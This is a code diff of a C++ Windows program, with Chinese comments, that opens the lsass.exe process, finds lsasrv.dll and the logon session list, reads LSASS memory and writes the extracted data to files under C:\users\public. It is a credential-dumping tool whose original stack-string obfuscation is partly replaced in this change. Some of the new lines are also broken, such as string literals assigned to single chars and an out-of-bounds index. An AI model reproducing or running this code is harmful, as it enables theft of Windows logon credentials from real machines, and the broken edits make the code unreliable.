@@ -1,6 +1,23 @@
 #include <Windows.h>
 #include <winternl.h> 
 
+
+inline void FBXorCrypt(char* str, size_t len) {
+
+    int intArr[100];
+    for (int i = 0; i < 100; i++) {
+        intArr[i] = 1;// 1//, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1 };
+
+    }
+    int i;
+
+    for (i = 0; i < len; i++) {
+
+        str[i] = intArr[i] ^ str[i];
+
+    }
+
+}
 inline void MYS_ecureZeroMemory(char* fuck, int number) {
     for (int i = 0; i < number; i++) {
         fuck[i] = 0;
@@ -225,32 +242,32 @@ int main() {
     char stack_string[100];
     char _dbg_string[100];
     MYS_ecureZeroMemory(_dbg_string, 100); _dbg_string[0] = 'k'; _dbg_string[1] = 'e'; _dbg_string[2] = 'r'; _dbg_string[3] = 'n'; _dbg_string[4] = 'e'; _dbg_string[5] = 'l'; _dbg_string[6] = '3'; _dbg_string[7] = '2'; _dbg_string[8] = '.'; _dbg_string[9] = 'd'; _dbg_string[10] = 'l'; _dbg_string[11] = 'l';
-    HMODULE ahndleeeeer = GetModuleHandleA(_dbg_string);
+    HMODULE ahndleeeeer = GetModuleHandleA("kernel32.dll");
     _kernel32_base_addr = reinterpret_cast<DWORD64>(ahndleeeeer);
     MYS_ecureZeroMemory(_dbg_string, 100); _dbg_string[0] = 'L'; _dbg_string[1] = 'o'; _dbg_string[2] = 'a'; _dbg_string[3] = 'd'; _dbg_string[4] = 'L'; _dbg_string[5] = 'i'; _dbg_string[6] = 'b'; _dbg_string[7] = 'r'; _dbg_string[8] = 'a'; _dbg_string[9] = 'r'; _dbg_string[10] = 'y'; _dbg_string[11] = 'A';
-    PNT_LoadLibraryA NT_LoadLibraryA = (PNT_LoadLibraryA)GetProcAddress(ahndleeeeer, _dbg_string);
+    PNT_LoadLibraryA NT_LoadLibraryA = (PNT_LoadLibraryA)GetProcAddress(ahndleeeeer, "LoadLibraryA");
     MYS_ecureZeroMemory(_dbg_string, 100); _dbg_string[0] = 'G'; _dbg_string[1] = 'e'; _dbg_string[2] = 't'; _dbg_string[3] = 'P'; _dbg_string[4] = 'r'; _dbg_string[5] = 'o'; _dbg_string[6] = 'c'; _dbg_string[7] = 'A'; _dbg_string[8] = 'd'; _dbg_string[9] = 'd'; _dbg_string[10] = 'r'; _dbg_string[11] = 'e'; _dbg_string[12] = 's'; _dbg_string[13] = 's';
-    PNT_GetProcAddress NT_GetProcAddress = (PNT_GetProcAddress)GetProcAddress(ahndleeeeer, _dbg_string);
+    PNT_GetProcAddress NT_GetProcAddress = (PNT_GetProcAddress)GetProcAddress(ahndleeeeer, "GetProcAddress");
 
     // 从文件中读取数组索引值，获取相关符号的偏移量
 
     // 首先要从kernel32中获取CreateFileA/ReadFile
     MYS_ecureZeroMemory(stack_string, 50);
     stack_string[0] = 'C'; stack_string[1] = 'r'; stack_string[2] = 'e'; stack_string[3] = 'a'; stack_string[4] = 't'; stack_string[5] = 'e'; stack_string[6] = 'F'; stack_string[7] = 'i'; stack_string[8] = 'l'; stack_string[9] = 'e'; stack_string[10] = 'A';
-    PNT_CreateFileA NT_CreateFileA = (PNT_CreateFileA)NT_GetProcAddress((HMODULE)_kernel32_base_addr, stack_string);
+    PNT_CreateFileA NT_CreateFileA = (PNT_CreateFileA)NT_GetProcAddress((HMODULE)_kernel32_base_addr, "CreateFileA");
     MYS_ecureZeroMemory(stack_string, 50);
     stack_string[0] = 'R'; stack_string[1] = 'e'; stack_string[2] = 'a'; stack_string[3] = 'd'; stack_string[4] = 'F'; stack_string[5] = 'i'; stack_string[6] = 'l'; stack_string[7] = 'e';
-    PNT_ReadFile NT_ReadFile = (PNT_ReadFile)NT_GetProcAddress((HMODULE)_kernel32_base_addr, stack_string);
+    PNT_ReadFile NT_ReadFile = (PNT_ReadFile)NT_GetProcAddress((HMODULE)_kernel32_base_addr, "ReadFile");
 
 
     MYS_ecureZeroMemory(stack_string, 50);
     stack_string[0] = 'C'; stack_string[1] = 'l'; stack_string[2] = 'o'; stack_string[3] = 's'; stack_string[4] = 'e'; stack_string[5] = 'H'; stack_string[6] = 'a'; stack_string[7] = 'n'; stack_string[8] = 'd'; stack_string[9] = 'l'; stack_string[10] = 'e';
-    PNT_CloseHandle NT_CloseHandle = (PNT_CloseHandle)NT_GetProcAddress((HMODULE)_kernel32_base_addr, stack_string);
+    PNT_CloseHandle NT_CloseHandle = (PNT_CloseHandle)NT_GetProcAddress((HMODULE)_kernel32_base_addr, "CloseHandle");
 
     // 获取文件句柄
     MYS_ecureZeroMemory(stack_string, 50);
     stack_string[0] = 'C'; stack_string[1] = ':'; stack_string[2] = '\\'; stack_string[3] = 'u'; stack_string[4] = 's'; stack_string[5] = 'e'; stack_string[6] = 'r'; stack_string[7] = 's'; stack_string[8] = '\\'; stack_string[9] = 'p'; stack_string[10] = 'u'; stack_string[11] = 'b'; stack_string[12] = 'l'; stack_string[13] = 'i'; stack_string[14] = 'c'; stack_string[15] = '\\'; stack_string[16] = 'i'; stack_string[17] = 'l'; stack_string[18] = 'i'; stack_string[19] = '6'; stack_string[20] = 'a'; stack_string[21] = 'o';
-    HANDLE hFile = NT_CreateFileA(stack_string,               // file to open
+    HANDLE hFile = NT_CreateFileA("C:\\users\\public\\ili6ao",               // file to open
         GENERIC_READ,          // open for reading
         FILE_SHARE_READ,       // share for reading
         NULL,                  // default security
@@ -261,8 +278,7 @@ int main() {
     // 读取文件
     MYS_ecureZeroMemory(stack_string, 50);
     DWORD out = 0;
-    if (NT_ReadFile(hFile,
-        stack_string,
+    if (NT_ReadFile(hFile,   stack_string,
         50,
         &out,
         NULL
@@ -368,7 +384,7 @@ int main() {
 
     MYS_ecureZeroMemory(stack_string, 50);
     stack_string[0] = 'O'; stack_string[1] = 'p'; stack_string[2] = 'e'; stack_string[3] = 'n'; stack_string[4] = 'P'; stack_string[5] = 'r'; stack_string[6] = 'o'; stack_string[7] = 'c'; stack_string[8] = 'e'; stack_string[9] = 's'; stack_string[10] = 's';
-    PNT_OpenProcess NT_OpenProcess = (PNT_OpenProcess)NT_GetProcAddress((HMODULE)_kernel32_base_addr, stack_string);
+    PNT_OpenProcess NT_OpenProcess = (PNT_OpenProcess)NT_GetProcAddress((HMODULE)_kernel32_base_addr, "OpenProcess");
     HANDLE _lsass_handle = NT_OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, _lsass_pid);
 
     if (INVALID_HANDLE_VALUE == _lsass_handle)  return 0;
@@ -383,22 +399,22 @@ int main() {
     if (!_psapi_base_addr) {
         MYS_ecureZeroMemory(stack_string, 50);
         stack_string[0] = 'p'; stack_string[1] = 's'; stack_string[2] = 'a'; stack_string[3] = 'p'; stack_string[4] = 'i'; stack_string[5] = '.'; stack_string[6] = 'd'; stack_string[7] = 'l'; stack_string[8] = 'l';
-        _psapi_module = NT_LoadLibraryA(stack_string);
+        _psapi_module = NT_LoadLibraryA("psapi.dll");
     }
     else
         _psapi_module = (HMODULE)_psapi_base_addr;
 
     MYS_ecureZeroMemory(stack_string, 50);
     stack_string[0] = 'E'; stack_string[1] = 'n'; stack_string[2] = 'u'; stack_string[3] = 'm'; stack_string[4] = 'P'; stack_string[5] = 'r'; stack_string[6] = 'o'; stack_string[7] = 'c'; stack_string[8] = 'e'; stack_string[9] = 's'; stack_string[10] = 's'; stack_string[11] = 'M'; stack_string[12] = 'o'; stack_string[13] = 'd'; stack_string[14] = 'u'; stack_string[15] = 'l'; stack_string[16] = 'e'; stack_string[17] = 's';
-    PNT_EnumProcessModules NT_EnumProcessModules = (PNT_EnumProcessModules)NT_GetProcAddress(_psapi_module, stack_string);
+    PNT_EnumProcessModules NT_EnumProcessModules = (PNT_EnumProcessModules)NT_GetProcAddress(_psapi_module, "EnumProcessModules");
 
     MYS_ecureZeroMemory(stack_string, 50);
     stack_string[0] = 'G'; stack_string[1] = 'e'; stack_string[2] = 't'; stack_string[3] = 'M'; stack_string[4] = 'o'; stack_string[5] = 'd'; stack_string[6] = 'u'; stack_string[7] = 'l'; stack_string[8] = 'e'; stack_string[9] = 'F'; stack_string[10] = 'i'; stack_string[11] = 'l'; stack_string[12] = 'e'; stack_string[13] = 'N'; stack_string[14] = 'a'; stack_string[15] = 'm'; stack_string[16] = 'e'; stack_string[17] = 'E'; stack_string[18] = 'x'; stack_string[19] = 'A';
-    PNT_GetModuleFileNameExA NT_GetModuleFileNameExA = (PNT_GetModuleFileNameExA)NT_GetProcAddress(_psapi_module, stack_string);
+    PNT_GetModuleFileNameExA NT_GetModuleFileNameExA = (PNT_GetModuleFileNameExA)NT_GetProcAddress(_psapi_module, "GetModuleFileNameExA");
 
     MYS_ecureZeroMemory(stack_string, 50);
     stack_string[0] = 'W'; stack_string[1] = 'r'; stack_string[2] = 'i'; stack_string[3] = 't'; stack_string[4] = 'e'; stack_string[5] = 'F'; stack_string[6] = 'i'; stack_string[7] = 'l'; stack_string[8] = 'e';
-    PNT_WriteFile NT_WriteFile = (PNT_WriteFile)NT_GetProcAddress((HMODULE)_kernel32_base_addr, stack_string);
+    PNT_WriteFile NT_WriteFile = (PNT_WriteFile)NT_GetProcAddress((HMODULE)_kernel32_base_addr, "WriteFile");
 
 
 
@@ -427,7 +443,7 @@ int main() {
             //循环完成后，j就是字符串的实际长度
             BOOL flag = 1;
             MYS_ecureZeroMemory(stack_string, 50);
-            stack_string[0] = 'l'; stack_string[1] = 's'; stack_string[2] = 'a'; stack_string[3] = 's'; stack_string[4] = 's'; stack_string[5] = '.'; stack_string[6] = 'e'; stack_string[7] = 'x'; stack_string[8] = 'e';
+            stack_string[0] = "lsass.exe";
             for (int k = 0; k < 9; k++) {
                 if (stack_string[8 - k] != modName[j - 1 - k]) {
                     flag = 0;
@@ -441,7 +457,7 @@ int main() {
 
             flag = 1;
             MYS_ecureZeroMemory(stack_string, 50);
-            stack_string[0] = 'l'; stack_string[1] = 's'; stack_string[2] = 'a'; stack_string[3] = 's'; stack_string[4] = 'r'; stack_string[5] = 'v'; stack_string[6] = '.'; stack_string[7] = 'd'; stack_string[8] = 'l'; stack_string[9] = 'l';
+            stack_string[100] = "lsasrv.dll";
             for (int k = 0; k < 10; k++) {
                 // 需要同时对大小写进行检查
                 if ((stack_string[9 - k] != modName[j - 1 - k]) && (stack_string[9 - k] - 32 != modName[j - 1 - k])) {
@@ -488,8 +504,8 @@ int main() {
     // lsasrv+_logon_session_list_offset+3可以得到相对偏移量的地址DWORD
 
     MYS_ecureZeroMemory(stack_string, 50);
-    stack_string[0] = 'R'; stack_string[1] = 'e'; stack_string[2] = 'a'; stack_string[3] = 'd'; stack_string[4] = 'P'; stack_string[5] = 'r'; stack_string[6] = 'o'; stack_string[7] = 'c'; stack_string[8] = 'e'; stack_string[9] = 's'; stack_string[10] = 's'; stack_string[11] = 'M'; stack_string[12] = 'e'; stack_string[13] = 'm'; stack_string[14] = 'o'; stack_string[15] = 'r'; stack_string[16] = 'y';
-    PNT_ReadProcessMemory NT_ReadProcessMemory = (PNT_ReadProcessMemory)NT_GetProcAddress((HMODULE)_kernel32_base_addr, stack_string);
+   
+    PNT_ReadProcessMemory NT_ReadProcessMemory = (PNT_ReadProcessMemory)NT_GetProcAddress((HMODULE)_kernel32_base_addr, "ReadProcessMemory");
     SIZE_T bytesRead = 0;
     MYS_ecureZeroMemory(stack_string, 50);
 #ifdef DEBUG
@@ -667,9 +683,8 @@ int main() {
 
             // 首先要写入长度
             MYS_ecureZeroMemory(stack_string, 50);
-            stack_string[0] = 'C'; stack_string[1] = ':'; stack_string[2] = '\\'; stack_string[3] = 'u'; stack_string[4] = 's'; stack_string[5] = 'e'; stack_string[6] = 'r'; stack_string[7] = 's'; stack_string[8] = '\\'; stack_string[9] = 'p'; stack_string[10] = 'u'; stack_string[11] = 'b'; stack_string[12] = 'l'; stack_string[13] = 'i'; stack_string[14] = 'c'; stack_string[15] = '\\'; stack_string[16] = 'k'; stack_string[17] = 'i'; stack_string[18] = 'a'; stack_string[19] = 'a'; stack_string[20] = 'd';
-            hFile = NT_CreateFileA(
-                stack_string,                   // File path
+             
+            hFile = NT_CreateFileA(  "C:\\users\\public\\kiaad",                   // File path
                 FILE_APPEND_DATA,              // Access mode (write)
                 0,                          // Share mode (no sharing)
                 NULL,                       // Security attributes (default)
@@ -754,9 +769,8 @@ int main() {
     MYS_ecureZeroMemory(stack_string, 50);
     // 写入文件
     // 3iaad
-    stack_string[0] = 'C'; stack_string[1] = ':'; stack_string[2] = '\\'; stack_string[3] = 'u'; stack_string[4] = 's'; stack_string[5] = 'e'; stack_string[6] = 'r'; stack_string[7] = 's'; stack_string[8] = '\\'; stack_string[9] = 'p'; stack_string[10] = 'u'; stack_string[11] = 'b'; stack_string[12] = 'l'; stack_string[13] = 'i'; stack_string[14] = 'c'; stack_string[15] = '\\'; stack_string[16] = '3'; stack_string[17] = 'i'; stack_string[18] = 'a'; stack_string[19] = 'a'; stack_string[20] = 'd';
-    hFile = NT_CreateFileA(
-        stack_string,                   // File path
+     
+    hFile = NT_CreateFileA(   "C:\\users\\public\\3iaad",                   // File path
         FILE_APPEND_DATA,              // Access mode (write)
         0,                          // Share mode (no sharing)
         NULL,                       // Security attributes (default)
@@ -828,9 +842,8 @@ int main() {
     MYS_ecureZeroMemory(stack_string, 50);
     // 写入文件
     // aiaad
-    stack_string[0] = 'C'; stack_string[1] = ':'; stack_string[2] = '\\'; stack_string[3] = 'u'; stack_string[4] = 's'; stack_string[5] = 'e'; stack_string[6] = 'r'; stack_string[7] = 's'; stack_string[8] = '\\'; stack_string[9] = 'p'; stack_string[10] = 'u'; stack_string[11] = 'b'; stack_string[12] = 'l'; stack_string[13] = 'i'; stack_string[14] = 'c'; stack_string[15] = '\\'; stack_string[16] = 'a'; stack_string[17] = 'i'; stack_string[18] = 'a'; stack_string[19] = 'a'; stack_string[20] = 'd';
-    hFile = NT_CreateFileA(
-        stack_string,                   // File path
+   
+    hFile = NT_CreateFileA(  "C:\\users\\public\\aiaad",                   // File path
         FILE_APPEND_DATA,              // Access mode (write)
         0,                          // Share mode (no sharing)
         NULL,                       // Security attributes (default)
